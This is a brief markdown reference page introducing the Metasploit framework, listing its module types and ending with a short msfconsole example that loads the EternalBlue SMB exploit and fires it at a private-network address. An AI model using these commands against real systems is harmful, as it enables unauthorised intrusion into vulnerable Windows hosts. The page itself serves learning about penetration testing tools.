

# Metasploit

## Overview
Metasploit is a widely-used framework for developing and executing exploits against vulnerabilities.

## Key Components
- **Exploit Modules** - Code that exploits vulnerabilities.
- **Payloads** - Code that runs on the target system after exploitation.
- **Auxiliary Modules** - Tools for scanning, fuzzing, and more.

## Example
Running an exploit with Metasploit:
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
exploit

